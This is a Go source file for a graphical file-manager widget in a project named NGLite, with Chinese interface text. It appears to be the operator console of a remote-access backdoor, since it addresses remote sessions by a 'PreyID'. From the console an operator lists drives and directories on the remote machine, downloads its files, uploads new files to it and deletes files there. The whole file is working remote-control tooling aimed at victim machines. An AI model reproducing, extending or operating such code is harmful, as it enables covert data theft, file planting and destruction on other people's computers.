package widgets

import (
	"NGLite/internal/core"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"path/filepath"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/widget"
)

type FileManagerWidget struct {
	widget.BaseWidget
	dispatcher     *core.CommandDispatcher
	currentSession *core.Session
	currentPath    string
	
	pathEntry      *widget.Entry
	fileList       *widget.List
	files          []FileItem
	outputText     *widget.Entry
	progressBar    *widget.ProgressBar
	container      *fyne.Container
	window         fyne.Window
}

type FileItem struct {
	Name  string
	Path  string
	Size  int64
	IsDir bool
}

func NewFileManagerWidget(dispatcher *core.CommandDispatcher, window fyne.Window) *FileManagerWidget {
	w := &FileManagerWidget{
		dispatcher: dispatcher,
		files:      []FileItem{},
		window:     window,
	}
	
	w.pathEntry = widget.NewEntry()
	w.pathEntry.SetPlaceHolder("当前路径")
	w.pathEntry.Disable()
	
	w.outputText = widget.NewMultiLineEntry()
	w.outputText.SetText("选择会话后可查看文件\n\n操作说明：\n- 单击文件夹进入\n- 双击文件下载\n- 右键菜单更多操作\n")
	w.outputText.Wrapping = fyne.TextWrapWord
	w.outputText.Disable()
	
	w.progressBar = widget.NewProgressBar()
	w.progressBar.Hide()
	
	w.fileList = widget.NewList(
		func() int {
			return len(w.files)
		},
		func() fyne.CanvasObject {
			return widget.NewLabel("Template")
		},
		func(id widget.ListItemID, obj fyne.CanvasObject) {
			if id >= len(w.files) {
				return
			}
			file := w.files[id]
			label := obj.(*widget.Label)
			
			icon := "📄"
			if file.IsDir {
				icon = "📁"
			}
			
			sizeStr := formatSize(file.Size)
			if file.IsDir {
				sizeStr = "<DIR>"
			}
			
			label.SetText(fmt.Sprintf("%s %s (%s)", icon, file.Name, sizeStr))
		},
	)
	
	w.fileList.OnSelected = func(id widget.ListItemID) {
		if id >= len(w.files) {
			return
		}
		file := w.files[id]
		if file.IsDir {
			w.loadDirectory(file.Path)
		} else {
			w.showFileMenu(file)
		}
	}
	
	listDrivesBtn := widget.NewButton("列出盘符", func() {
		w.listDrives()
	})
	
	refreshBtn := widget.NewButton("刷新", func() {
		if w.currentPath != "" {
			w.loadDirectory(w.currentPath)
		}
	})
	
	parentDirBtn := widget.NewButton("上级目录", func() {
		w.goToParent()
	})
	
	uploadBtn := widget.NewButton("上传文件", func() {
		w.showUploadDialog()
	})
	
	toolbar := container.NewHBox(
		listDrivesBtn,
		refreshBtn,
		parentDirBtn,
		uploadBtn,
	)
	
	// 文件列表区域：顶部固定路径和工具栏，底部固定进度条，中间文件列表自适应
	fileSection := container.NewBorder(
		container.NewVBox(w.pathEntry, toolbar),
		w.progressBar,
		nil,
		nil,
		w.fileList,
	)
	
	// 输出日志区域使用Scroll确保可滚动
	outputScroll := container.NewScroll(w.outputText)
	
	// 使用VSplit支持上下拖动调整文件列表和日志区域大小
	split := container.NewVSplit(
		fileSection,
		outputScroll,
	)
	split.SetOffset(0.7) // 初始文件区域占70%
	
	// 使用Max容器确保split填满整个区域
	w.container = container.NewMax(split)
	
	w.ExtendBaseWidget(w)
	return w
}

func (w *FileManagerWidget) SetSession(session *core.Session) {
	w.currentSession = session
	w.outputText.SetText(fmt.Sprintf("会话: %s\n选择操作查看文件系统\n\n操作说明：\n- 单击文件夹进入\n- 双击文件下载\n- 右键更多操作\n", session.PreyID))
	w.files = []FileItem{}
	w.currentPath = ""
	w.pathEntry.SetText("")
	w.fileList.Refresh()
	w.progressBar.Hide()
}

func (w *FileManagerWidget) listDrives() {
	if w.currentSession == nil {
		w.appendOutput("错误: 未选择会话\n")
		return
	}
	
	w.appendOutput("正在获取盘符列表...\n")
	
	go func() {
		result, err := w.dispatcher.ListDrives(w.currentSession.PreyID)
		if err != nil {
			w.appendOutput(fmt.Sprintf("错误: %v\n", err))
			return
		}
		
		var response struct {
			Drives  []string `json:"drives"`
			Success bool     `json:"success"`
			Error   string   `json:"error"`
		}
		
		if err := json.Unmarshal([]byte(result), &response); err != nil {
			w.appendOutput(fmt.Sprintf("解析错误: %v\n", err))
			return
		}
		
		if !response.Success {
			w.appendOutput(fmt.Sprintf("获取失败: %s\n", response.Error))
			return
		}
		
		w.files = []FileItem{}
		for _, drive := range response.Drives {
			w.files = append(w.files, FileItem{
				Name:  drive,
				Path:  drive,
				IsDir: true,
			})
		}
		
		w.currentPath = ""
		w.pathEntry.SetText("盘符列表")
		w.fileList.Refresh()
		w.appendOutput(fmt.Sprintf("找到 %d 个盘符\n", len(response.Drives)))
	}()
}

func (w *FileManagerWidget) loadDirectory(path string) {
	if w.currentSession == nil {
		w.appendOutput("错误: 未选择会话\n")
		return
	}
	
	w.appendOutput(fmt.Sprintf("正在加载: %s\n", path))
	
	go func() {
		result, err := w.dispatcher.ListDirectory(w.currentSession.PreyID, path)
		if err != nil {
			w.appendOutput(fmt.Sprintf("错误: %v\n", err))
			return
		}
		
		var response struct {
			Path    string `json:"path"`
			Files   []struct {
				Name  string `json:"name"`
				Path  string `json:"path"`
				Size  int64  `json:"size"`
				IsDir bool   `json:"is_dir"`
			} `json:"files"`
			Success bool   `json:"success"`
			Error   string `json:"error"`
		}
		
		if err := json.Unmarshal([]byte(result), &response); err != nil {
			w.appendOutput(fmt.Sprintf("解析错误: %v\n", err))
			return
		}
		
		if !response.Success {
			w.appendOutput(fmt.Sprintf("加载失败: %s\n", response.Error))
			return
		}
		
		w.files = []FileItem{}
		for _, file := range response.Files {
			w.files = append(w.files, FileItem{
				Name:  file.Name,
				Path:  file.Path,
				Size:  file.Size,
				IsDir: file.IsDir,
			})
		}
		
		w.currentPath = response.Path
		w.pathEntry.SetText(response.Path)
		w.fileList.Refresh()
		w.appendOutput(fmt.Sprintf("加载完成，共 %d 项\n", len(response.Files)))
	}()
}

func (w *FileManagerWidget) showFileMenu(file FileItem) {
	downloadItem := fyne.NewMenuItem("下载文件", func() {
		w.downloadFile(file)
	})
	
	deleteItem := fyne.NewMenuItem("删除", func() {
		w.deleteFile(file)
	})
	
	menu := fyne.NewMenu("",
		downloadItem,
		deleteItem,
	)
	
	popup := widget.NewPopUpMenu(menu, w.window.Canvas())
	popup.ShowAtPosition(fyne.NewPos(100, 100))
}

func (w *FileManagerWidget) downloadFile(file FileItem) {
	if w.currentSession == nil {
		w.appendOutput("错误: 未选择会话\n")
		return
	}
	
	if file.IsDir {
		w.appendOutput("错误: 不能下载文件夹\n")
		return
	}
	
	w.appendOutput(fmt.Sprintf("正在下载: %s (%.2f MB)...\n", file.Name, float64(file.Size)/(1024*1024)))
	w.progressBar.Show()
	w.progressBar.SetValue(0)
	
	go func() {
		result, err := w.dispatcher.DownloadFile(w.currentSession.PreyID, file.Path)
		
		w.progressBar.SetValue(0.5)
		
		if err != nil {
			w.appendOutput(fmt.Sprintf("下载失败: %v\n", err))
			w.progressBar.Hide()
			return
		}
		
		var response struct {
			Path      string `json:"path"`
			Content   string `json:"content"`
			Size      int64  `json:"size"`
			Success   bool   `json:"success"`
			Error     string `json:"error"`
			IsChunked bool   `json:"is_chunked"`
		}
		
		if err := json.Unmarshal([]byte(result), &response); err != nil {
			w.appendOutput(fmt.Sprintf("解析错误: %v\n", err))
			w.progressBar.Hide()
			return
		}
		
		if !response.Success {
			if response.IsChunked {
				w.appendOutput(fmt.Sprintf("文件过大 (>10MB)，暂不支持\n错误: %s\n", response.Error))
			} else {
				w.appendOutput(fmt.Sprintf("下载失败: %s\n", response.Error))
			}
			w.progressBar.Hide()
			return
		}
		
		w.progressBar.SetValue(0.8)
		
		decoded, err := base64.StdEncoding.DecodeString(response.Content)
		if err != nil {
			w.appendOutput(fmt.Sprintf("解码失败: %v\n", err))
			w.progressBar.Hide()
			return
		}
		
		w.saveFileDialog(file.Name, decoded)
		w.progressBar.SetValue(1.0)
		w.appendOutput(fmt.Sprintf("下载完成: %s (%.2f MB)\n", file.Name, float64(len(decoded))/(1024*1024)))
		
		w.progressBar.Hide()
	}()
}

func (w *FileManagerWidget) saveFileDialog(filename string, data []byte) {
	dialog.ShowFileSave(func(writer fyne.URIWriteCloser, err error) {
		if err != nil {
			w.appendOutput(fmt.Sprintf("保存失败: %v\n", err))
			return
		}
		if writer == nil {
			return
		}
		defer writer.Close()
		
		_, err = writer.Write(data)
		if err != nil {
			w.appendOutput(fmt.Sprintf("写入失败: %v\n", err))
			return
		}
		
		w.appendOutput(fmt.Sprintf("已保存到: %s\n", writer.URI().Path()))
	}, w.window)
}

func (w *FileManagerWidget) showUploadDialog() {
	if w.currentSession == nil {
		w.appendOutput("错误: 未选择会话\n")
		return
	}
	
	if w.currentPath == "" {
		w.appendOutput("错误: 请先进入目标目录\n")
		return
	}
	
	dialog.ShowFileOpen(func(reader fyne.URIReadCloser, err error) {
		if err != nil {
			w.appendOutput(fmt.Sprintf("打开失败: %v\n", err))
			return
		}
		if reader == nil {
			return
		}
		defer reader.Close()
		
		data, err := ioutil.ReadAll(reader)
		if err != nil {
			w.appendOutput(fmt.Sprintf("读取失败: %v\n", err))
			return
		}
		
		filename := reader.URI().Name()
		w.uploadFile(filename, data)
	}, w.window)
}

func (w *FileManagerWidget) uploadFile(filename string, data []byte) {
	if len(data) > 10*1024*1024 {
		w.appendOutput(fmt.Sprintf("文件过大: %s (>10MB)，暂不支持\n", filename))
		return
	}
	
	remotePath := filepath.Join(w.currentPath, filename)
	encoded := base64.StdEncoding.EncodeToString(data)
	
	w.appendOutput(fmt.Sprintf("正在上传: %s (%.2f MB)...\n", filename, float64(len(data))/(1024*1024)))
	w.progressBar.Show()
	w.progressBar.SetValue(0.3)
	
	go func() {
		result, err := w.dispatcher.UploadFile(w.currentSession.PreyID, remotePath, encoded)
		
		w.progressBar.SetValue(0.8)
		
		if err != nil {
			w.appendOutput(fmt.Sprintf("上传失败: %v\n", err))
			w.progressBar.Hide()
			return
		}
		
		var response struct {
			Path    string `json:"path"`
			Success bool   `json:"success"`
			Error   string `json:"error"`
		}
		
		if err := json.Unmarshal([]byte(result), &response); err != nil {
			w.appendOutput(fmt.Sprintf("解析错误: %v\n", err))
			w.progressBar.Hide()
			return
		}
		
		if !response.Success {
			w.appendOutput(fmt.Sprintf("上传失败: %s\n", response.Error))
		} else {
			w.appendOutput(fmt.Sprintf("上传成功: %s\n", remotePath))
			w.loadDirectory(w.currentPath)
		}
		
		w.progressBar.SetValue(1.0)
		w.progressBar.Hide()
	}()
}

func (w *FileManagerWidget) deleteFile(file FileItem) {
	confirm := dialog.NewConfirm(
		"确认删除",
		fmt.Sprintf("确定要删除 %s 吗？", file.Name),
		func(ok bool) {
			if !ok {
				return
			}
			w.performDelete(file)
		},
		w.window,
	)
	confirm.Show()
}

func (w *FileManagerWidget) performDelete(file FileItem) {
	if w.currentSession == nil {
		return
	}
	
	w.appendOutput(fmt.Sprintf("正在删除: %s...\n", file.Name))
	
	go func() {
		result, err := w.dispatcher.DeleteFile(w.currentSession.PreyID, file.Path)
		if err != nil {
			w.appendOutput(fmt.Sprintf("删除失败: %v\n", err))
			return
		}
		
		var response struct {
			Path    string `json:"path"`
			Success bool   `json:"success"`
			Error   string `json:"error"`
		}
		
		if err := json.Unmarshal([]byte(result), &response); err != nil {
			w.appendOutput(fmt.Sprintf("解析错误: %v\n", err))
			return
		}
		
		if !response.Success {
			w.appendOutput(fmt.Sprintf("删除失败: %s\n", response.Error))
		} else {
			w.appendOutput(fmt.Sprintf("删除成功: %s\n", file.Name))
			w.loadDirectory(w.currentPath)
		}
	}()
}

func (w *FileManagerWidget) goToParent() {
	if w.currentPath == "" {
		w.appendOutput("当前在根目录\n")
		return
	}
	
	parentPath := getParentPath(w.currentPath)
	if parentPath == "" {
		w.listDrives()
	} else {
		w.loadDirectory(parentPath)
	}
}

func (w *FileManagerWidget) appendOutput(text string) {
	current := w.outputText.Text
	w.outputText.SetText(current + text)
}

func (w *FileManagerWidget) CreateRenderer() fyne.WidgetRenderer {
	return widget.NewSimpleRenderer(w.container)
}

func formatSize(size int64) string {
	const unit = 1024
	if size < unit {
		return fmt.Sprintf("%d B", size)
	}
	div, exp := int64(unit), 0
	for n := size / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}
	return fmt.Sprintf("%.1f %cB", float64(size)/float64(div), "KMGTPE"[exp])
}

func getParentPath(path string) string {
	if path == "" || path == "/" {
		return ""
	}
	
	if len(path) == 3 && path[1] == ':' && (path[2] == '\\' || path[2] == '/') {
		return ""
	}
	
	for i := len(path) - 2; i >= 0; i-- {
		if path[i] == '/' || path[i] == '\\' {
			return path[:i+1]
		}
	}
	
	return ""
}
